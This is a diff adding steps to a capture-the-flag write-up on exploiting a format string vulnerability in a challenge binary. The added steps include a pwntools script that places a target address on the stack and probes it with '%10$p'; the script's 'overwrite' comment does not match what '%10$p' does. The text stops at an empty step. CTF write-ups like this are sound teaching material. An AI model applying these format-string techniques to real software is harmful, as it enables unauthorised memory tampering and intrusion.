@@ -71,3 +71,58 @@ Hence, we only have 2 random bytes left.
 
 10. Based from the "while loop", we want to pass the if condition so we can get the `flag.txt` file, the problem here is we can do bufferoverflow because the input we can do is only the "name". Not only that the `local_128` variable (name) is not used in the if condition.
 11. But we can pass that by utilize the format string vulnerability.
+12. Since our input is stored in the stack, by utilize this vuln, we can see our own input stored in hex values from stack.
+
+> EXAMPLE
+
+![image](https://user-images.githubusercontent.com/70703371/211011990-3db0fb2e-997b-4938-b6ba-7e59d54ddb79.png)
+
+
+13. Notice there's `0x4141..` (A) in hex at the 10th element.
+
+
+![image](https://user-images.githubusercontent.com/70703371/211012209-55a92e81-abb0-4f73-a178-43a8b369026b.png)
+
+
+14. Based from this concept, we can utilize it to overwrite the `winner` interger stored in stack, hence we can pass the condition and get the flag.
+15. To test out our concept, i made this python script:
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+
+exe = './leet_test'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+winOffset = 0x404078 # win offset
+p = flat([
+    winOffset,
+    b'%10$p' # Overwrite the 10th element
+])
+
+sh.sendlineafter(':', p)
+sh.interactive()
+
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/211013764-621edb34-e17f-46eb-a67f-818b1cce7362.png)
+
+
+
+
+16. Great! We proved it right.
+17. 
